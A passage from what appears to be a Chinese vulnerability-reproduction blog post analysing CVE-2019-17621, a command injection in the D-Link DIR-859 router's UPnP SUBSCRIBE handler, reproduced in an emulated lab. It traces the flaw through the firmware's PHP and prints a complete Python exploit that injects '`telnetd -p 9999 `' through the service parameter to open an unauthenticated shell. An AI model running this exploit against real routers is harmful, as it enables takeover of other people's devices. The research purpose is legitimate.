        <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">GENA_subscribe_sid</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">,</span>  <span class="token variable">$TIMEOUT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">GENA_unsubscribe</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>可以看到当请求方式为SUBSCRIBE的时候才会进一步处理，该脚本中<code>GENA_subscribe_new()</code>处理了变量<code>$SHELL_FILE</code></p>
<pre class=" language-php"><code class="language-php"><span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>使用命令<code>grep -nr "GENA_subscribe_new"</code>搜索<code>GENA_subscribe_new()</code>发现其定义在upnpinc/gena.php脚本中。 </p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$remote</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">anchor</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$found</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* find subscription index &amp; uuid */</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token string">"subscription"</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"host"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$host</span> <span class="token operator">&amp;&amp;</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"uri"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$uri</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token variable">$found</span> <span class="token operator">=</span> <span class="token variable">$InDeX</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$found</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$count</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token string">"uuid:"</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/genuuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$found</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* get timeout */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$timeout</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/uptime"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$timeout</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/* set to nodes */</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/remote"</span><span class="token punctuation">,</span>    <span class="token variable">$remote</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">,</span>        <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/host"</span><span class="token punctuation">,</span>        <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uri"</span><span class="token punctuation">,</span>        <span class="token variable">$uri</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/timeout"</span><span class="token punctuation">,</span>    <span class="token variable">$new_timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/seq"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$new_uuid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>其中<code>GENA_subscribe_http_resp($new_uuid, $timeout)</code>是加载对订阅事件的应答报文头部。并没有处理<code>$shell_file</code></p>
<p>文件：gena.php，<code>GENA_subscribe_http_resp()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$sid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* Generate HTTP header */</span>
    <span class="token keyword">echo</span> <span class="token string">"HTTP/1.1 200 OK\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"SID: "</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"TIMEOUT: "</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string">"Second-infinite"</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"Second-"</span><span class="token punctuation">.</span><span class="token variable">$timeout</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"\r\n\r\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>继续跟踪<code>$shell_file</code>，发现真正处理<code>$shell_file</code>的<code>GENA_notify_init()</code>函数。</p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$sid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token variable">$inf_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't find inf_path by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$phyinf</span> <span class="token operator">=</span> <span class="token function">PHYINF_getifname</span><span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token punctuation">.</span><span class="token string">"/phyinf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$phyinf</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't get phyinf by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/upnpmsg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$upnpmsg</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token string">"/dev/null"</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span>
        <span class="token string">"#!/bin/sh\n"</span><span class="token punctuation">.</span>
        <span class="token string">'echo "[$0] ..." > '</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"xmldbc -P "</span><span class="token punctuation">.</span><span class="token variable">$target_php</span><span class="token punctuation">.</span>
            <span class="token string">" -V INF_UID="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_URL="</span><span class="token punctuation">.</span><span class="token variable">$uri</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_HOST="</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SID="</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SEQ=0"</span><span class="token punctuation">.</span>
            <span class="token string">" | httpc -i "</span><span class="token punctuation">.</span><span class="token variable">$phyinf</span><span class="token punctuation">.</span><span class="token string">" -d \""</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span><span class="token string">"\" -p TCP > "</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token string">"rm -f "</span><span class="token punctuation">.</span><span class="token variable">$shell_file</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现了<code>$shell_file</code>最后结束的地方，该函数两次调用<code>fwrite()</code>，在网上查阅了正常PHP函数<code>fwrite()</code>用法是结合<code>fopen()</code>来创建文件，这里的<code>fwrite()</code>可能重新定义了。第一次调用<code>fwrite()</code>，是新建一个名为<code>$shell_file</code>的文件。这没什么问题。</p>
<p>可以回溯之前提到的<code>sprintf()</code>，里面的SHELL_FILE变量是可以被我们控制的。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>file_name_pid<span class="token punctuation">.</span>sh</code></pre>
<p>问题出现在第二次调用<code>fwrite()</code>是向这个文件加入一行<code>"rm -f ".$shell_file."\n"</code>，目的是为了删除新建的文件。问题就出现在这个地方。</p>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=`telnetd -p 1234`"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh    
系统运行命令 rm <span class="token operator">-</span>rf <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh</code></pre>
<p>如果rm 命令遇到反引号，rm命令将会运行失败，并且继续执行反引号里面的命令。所以只要控制好SHELL_FILE变量就能触发漏洞。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用FIRMADYNE全仿真系统模拟路由器固件运行，可以自己参照firmadyne使用步骤写利用脚本，也可以利用知世师傅写的<a href="https://github.com/nightRainy/Auxiliary_tools/blob/master/iot/fastrun.py" target="_blank" rel="noopener">脚本</a>或者利用firmadyne的自动化利用工具 <a href="https://github.com/attify/firmware-analysis-toolkit" target="_blank" rel="noopener">firmware-analysis-toolkit</a> 中的./fat.py将固件模拟运行起来。</p>
<p><img src="dir859.png" alt=""></p>
<p>随后利用nmap进行扫描firmadynew为路由器配置的默认IP地址<code>192.168.0.1</code>发现，该主机确实存活并且开启了4个端口(53DNS端口、80HTTP端口、443HTTPS端口、49152应该是upnp端口)</p>
<p><img src="nmap.png" alt=""></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这是研究员Miguel Mendez Z.的<a href="https://github.com/s1kr10s/D-Link-DIR-859-RCE/blob/master/reverseshell-SUBSCRIBE.py" target="_blank" rel="noopener">EXP</a>脚本。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> os
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">def</span> <span class="token function">httpSUB</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">,</span> shell_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] Connection {host}:{port}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>server<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span>
    con <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    request <span class="token operator">=</span> <span class="token string">"SUBSCRIBE /gena.cgi?service="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>shell_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HTTP/1.0\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Host: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Callback: &lt;http://192.168.0.4:34033/ServiceProxy27>\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"NT: upnp:event\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Timeout: Second-1800\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Accept-Encoding: gzip, deflate\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Sending Payload'</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>server<span class="token punctuation">)</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    results <span class="token operator">=</span> con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Running Telnetd Service'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Opening Telnet Connection\n'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'telnet '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 9999'</span><span class="token punctuation">)</span>

serverInput <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'IP Router: '</span><span class="token punctuation">)</span>
portInput <span class="token operator">=</span> <span class="token number">49152</span> <span class="token comment" spellcheck="true">#upnp端口</span>

httpSUB<span class="token punctuation">(</span>serverInput<span class="token punctuation">,</span> portInput<span class="token punctuation">,</span> <span class="token string">'`telnetd -p 9999 `'</span><span class="token punctuation">)</span></code></pre>
<p>运行EXP结果如下：</p>
<p><img src="poc.png" alt=""></p>
<p>nmap扫描发现打开了9999端口，并能够在未授权的情况下获取路由器的shell。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104" target="_blank" rel="noopener">https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104</a></p>
<p><a href="https://nightrainy.github.io/2020/02/25/DIR-859-RCE分析-CVE-2019–17621复现/" target="_blank" rel="noopener">https://nightrainy.github.io/2020/02/25/DIR-859-RCE%E5%88%86%E6%9E%90-CVE-2019%E2%80%9317621%E5%A4%8D%E7%8E%B0/</a> </p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html</a> </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>d-link</tag>
        <tag>dir-859</tag>
      </tags>
  </entry>
</search>
